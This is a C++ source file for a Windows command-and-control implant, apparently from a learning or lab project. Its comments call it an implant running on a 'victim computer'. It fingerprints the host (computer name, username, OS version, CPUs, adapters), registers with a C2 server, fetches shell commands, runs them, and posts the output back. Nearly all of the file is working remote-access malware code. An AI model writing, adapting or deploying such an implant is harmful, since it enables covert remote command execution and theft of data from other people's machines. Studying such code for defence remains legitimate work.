#include <winsock2.h>
#include <iphlpapi.h>
#include <windows.h>
#include <string>
#include <iostream>
#include <stdlib.h>
#include "http.h"
#include "exec_shell.h"
#include "aes_gcm.h"
#include "nlohmann/json.hpp"

using json = nlohmann::json;

// implant configurations
LPCWSTR c2Domain = L"127.0.0.1";
LPCWSTR registerURI = L"/agent/register";
LPCWSTR getTaskURI = L"/agent/get_task";
LPCWSTR sendResultURI = L"agent/send_result";
std::string password = "password";
int port = 5000;
std::string agentId;
DWORD sleepTime = 10 * 1000;

// find the name of victim computer
std::string getComputerName() {

    std::string res;
    char *buf = (char *) malloc(BUF_SIZE);
    DWORD bufSize = BUF_SIZE;
    GetComputerNameA(buf, &bufSize);
    
    res.append(buf);
    
    return res;
}

// find the username of victim computer
std::string getUserName() {

    std::string res;
    char *buf = (char *) malloc(BUF_SIZE);

    std::string name = "USERNAME";
    GetEnvironmentVariableA(&name[0], buf, DWORD(BUF_SIZE));
    
    res.append(buf);
    
    return res;
}

//find the windows version running on victim machine
std::string getWindowsVer() {

    DWORD dwVersion = 0; 
    DWORD dwMajorVersion = 0;
    DWORD dwMinorVersion = 0; 
    DWORD dwBuild = 0;

    dwVersion = GetVersion();
 
    // Get the Windows version.

    dwMajorVersion = (DWORD)(LOBYTE(LOWORD(dwVersion)));
    dwMinorVersion = (DWORD)(HIBYTE(LOWORD(dwVersion)));

    // Get the build number.

    if (dwVersion < 0x80000000)              
        dwBuild = (DWORD)(HIWORD(dwVersion));

    std::string res;
    char *buf = (char *) malloc(BUF_SIZE);

    sprintf(buf, "%d.%d (%d)", dwMajorVersion, dwMinorVersion, dwBuild);

    res.append(buf);

    return res;

}

//find the victim's profile id
std::string getProfileID() {
    std::string res;
    char *buf = (char *) malloc(BUF_SIZE);
    
    std::string name = "WT_PROFILE_ID";
    GetEnvironmentVariableA(&name[0], buf, DWORD(BUF_SIZE));
    
    res.append(buf);
    return res;
}

// find number of processors in the victim machine
std::string getCPUNum() {
    std::string res;
    char *buf = (char *) malloc(BUF_SIZE);
    
    std::string name = "NUMBER_OF_PROCESSORS";
    GetEnvironmentVariableA(&name[0], buf, DWORD(BUF_SIZE));
    
    res.append(buf);
    return res;
}

std::string getNetworkInterfaceNum() {
    char *buf = (char *) malloc(BUF_SIZE);

    PIP_INTERFACE_INFO pInfo;
    pInfo = (IP_INTERFACE_INFO *) malloc( sizeof(IP_INTERFACE_INFO) );
    ULONG ulOutBufLen = 0;
    DWORD dwRetVal = 0;

    // get the necessary size in the ulOutBufLen variable
    if ( GetInterfaceInfo(pInfo, &ulOutBufLen) == ERROR_INSUFFICIENT_BUFFER) {
        free(pInfo);
        pInfo = (IP_INTERFACE_INFO *) malloc (ulOutBufLen);
    }

    // GetInterfaceInfo to get the actual data we need
    if ((dwRetVal = GetInterfaceInfo(pInfo, &ulOutBufLen)) == NO_ERROR ) {

        itoa(pInfo->NumAdapters, buf, 10);
        // free memory allocated
        free(pInfo);
        pInfo = NULL;
    } else if (dwRetVal == ERROR_NO_DATA) {
        itoa(0, buf, 10);
    } else {
        //failed to run GetInterfaceInfo
        return buf;
    }
    
    std::string res;
    res.append(buf);
    return res;
}

// register the agent on the c2 server
BOOL registerAgent() {
    
    json jsonPayload = {
        {"agent_id", getProfileID()},
        {"whoami", getComputerName()},
        {"username", getUserName()},
        {"password", password},
        {"cpus", getCPUNum()},
        {"osVersion", getWindowsVer()},
        {"adaptors", getNetworkInterfaceNum()}
    };

    std::string jsonString = jsonPayload.dump();

    std::string response = httpPost(c2Domain, port, registerURI, jsonString);
    std::cout << response << std::endl;

    json jsonResponse = json::parse(response);

    if (jsonResponse["status"] == "ok") {
        return TRUE;
    } else {
        return FALSE;
    }
}

// execute the list of commands and send the result back to the server
void executeCommands(std::vector<std::string> cmds) {
    for (int i = 0; i < cmds.size(); i++) {
        std::string result = exec_shell(&*cmds[i].begin());
        std::cout << result << std::endl;

        json jsonResult = {
            {"agent_id", agentId},
            {"password", password},
            {"command", cmds[i]},
            {"result", result}
        };

        std::string jsonString = jsonResult.dump();

        std::string response = httpPost(c2Domain, port, sendResultURI, jsonString);

        std::cout << response << std::endl;
    }
}

// get commands from server and execute them
void getTasksAndExecute() {
    json jsonPayload = {
        {"agent_id", agentId},
        {"password", password}
    };
    std::string jsonString = jsonPayload.dump();

    std::string response = httpPost(c2Domain, port, getTaskURI, jsonString);
    json jsonResponse = json::parse(response);

    if (jsonResponse["status"] == "ok") {
        std::vector<std::string> cmds = jsonResponse["cmd"];
        executeCommands(cmds);
    } else {
        std::cout << "no tasks at this time" << std::endl;
    }
}

int main(int argc, char* argv[]){

    // use a mutex to prevent multiple instances of the implant
    LPCSTR szUniqueNamedMutex = "magic_conch";
    HANDLE hHandle = CreateMutexA( NULL, TRUE, szUniqueNamedMutex );
    if( ERROR_ALREADY_EXISTS == GetLastError() )
    {
        // Program already running somewhere
        return 0; // Exit program
    }

    registerAgent();

    int i = 3;
    while(i > 0) {
        std::cout << "wake up" << std::endl;
        getTasksAndExecute();
        Sleep(sleepTime);
        i--;
    }

    // Upon app closing:
    ReleaseMutex( hHandle ); // Explicitly release mutex
    CloseHandle( hHandle ); // close handle before terminating

    return 0;
}